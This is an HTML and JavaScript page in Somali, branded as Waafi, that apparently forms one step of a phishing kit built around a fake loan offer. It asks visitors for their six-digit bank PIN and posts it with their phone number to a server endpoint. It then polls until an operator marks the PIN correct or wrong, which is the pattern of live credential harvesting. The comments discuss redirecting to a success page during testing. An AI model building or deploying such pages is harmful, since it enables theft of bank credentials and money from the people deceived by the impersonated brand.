<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waafi - Bank PIN</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { margin: 0; padding: 0; background-color: #fff; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        .container { flex: 1; padding: 40px 20px; text-align: center; display: flex; flex-direction: column; align-items: center; }
        h2 { font-size: 22px; color: #333; margin-bottom: 10px; font-weight: 500; width: 100%; }
        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 25px; width: 100%; }

        .pin-inputs { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
        .pin-inputs input {
            width: 45px; height: 55px; border: 1.5px solid #ccc; border-radius: 8px;
            text-align: center; font-size: 20px; font-weight: bold; outline: none;
        }
        .pin-inputs input:focus { border-color: #2ecc71; border-width: 2px; }

        .btn-verify {
            width: 100%; max-width: 320px; padding: 15px; border-radius: 10px;
            border: none; background-color: #e0e0e0; color: #a0a0a0;
            font-size: 14px; font-weight: bold; cursor: not-allowed; text-transform: uppercase;
            transition: 0.3s;
        }
        .btn-verify.active { background-color: #2ecc71; color: white; cursor: pointer; }

        #wait-container {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 50%;
        }
        .wait-text {
            font-size: 16px;
            font-weight: 600;
            color: #000000;
            margin-top: 20px;
        }

        .footer {
            position: relative; height: 250px; background: linear-gradient(to bottom, #2ecc71, #27ae60);
            border-top-left-radius: 50% 100px; border-top-right-radius: 50% 100px;
            display: flex; justify-content: center; align-items: center; color: white;
            font-size: 12px; margin-top: auto; width: 100%;
        }
    </style>
</head>

<body>

<div class="container" id="main-ui">
    <div id="input-section">
        <h2>Geli PIN-ka Bangiga</h2>
        <p>Fadlan geli 6-da god ee PIN-kaaga bangiga si aad u xaqiijiso aqoonsigaaga.</p>

        <div class="pin-inputs">
            <input type="password" maxlength="1" inputmode="numeric">
            <input type="password" maxlength="1" inputmode="numeric">
            <input type="password" maxlength="1" inputmode="numeric">
            <input type="password" maxlength="1" inputmode="numeric">
            <input type="password" maxlength="1" inputmode="numeric">
            <input type="password" maxlength="1" inputmode="numeric">
        </div>

        <button class="btn-verify" id="submit-btn">XAQIIJI PIN-KA BANGIGA</button>
    </div>

    <div id="wait-container">
        <div class="wait-text">Waa la diray. Fadlan sug oggolaanshaha...</div>
    </div>
</div>

<div class="footer">
    © 2026 Waafi Soomaaliya
</div>

<script>
const inputs = document.querySelectorAll('.pin-inputs input');
const btn = document.getElementById('submit-btn');
const inputSection = document.getElementById('input-section');
const waitContainer = document.getElementById('wait-container');

inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, ''); 
        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
        checkFull();
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && index > 0) {
            inputs[index - 1].focus();
        }
    });
});

function checkFull() {
    const pin = Array.from(inputs).map(i => i.value).join('');
    if (pin.length === 6) {
        btn.classList.add('active');
    } else {
        btn.classList.remove('active');
    }
}

btn.addEventListener('click', async () => {
    if (!btn.classList.contains('active')) return;

    // --- 1. KAYDINTA XOGTA (Backup Plan) ---
    // Haddii bogaggii hore aysan kaydin xogta, halkan ku kaydi si success.html u shaqeeyo
    if(!localStorage.getItem('loan_amount')) {
        localStorage.setItem('loan_amount', '1,000');
        localStorage.setItem('loan_term', '12');
        localStorage.setItem('monthly_repayment', '90');
    }

    const pin = Array.from(inputs).map(i => i.value).join('');
    const phone = localStorage.getItem('userPhone') || "User";

    inputSection.style.display = "none";
    waitContainer.style.display = "flex";

    try {
        const response = await fetch('/api/verify-bank-pin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone, bankPin: pin })
        });

        const data = await response.json();
        if (data.success) {
            startPolling(phone);
        } else {
            // Haddii uu khalad ka yimaado API-ga laakiin aad rabto inaad tijaabiso Success
            // window.location.href = "success.html";
        }
    } catch (err) {
        console.log("Cilad baa dhacay, laakiin tijaabo ahaan waxaan u gudbi doonaa success...");
        // --- 2. TIJAABO (REDIRECT) ---
        // Haddii server-kaagu uusan diyaarsanayn, 3 ilbiriqsi ka dib u gudbi success.html
        setTimeout(() => {
            window.location.href = "success.html";
        }, 3000);
    }
});

function startPolling(phone) {
    const pollInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
            const data = await res.json();

            if (data.status === "bank_pin_correct") {
                clearInterval(pollInterval);
                window.location.href = "success.html";
            } else if (data.status === "bank_pin_wrong") {
                clearInterval(pollInterval);
                alert("PIN-ka Bangiga waa khalad.");
                location.reload();
            }
        } catch (e) {
            console.error("Waiting for verification...");
        }
    }, 3000);
}
</script>

</body>
              </html>
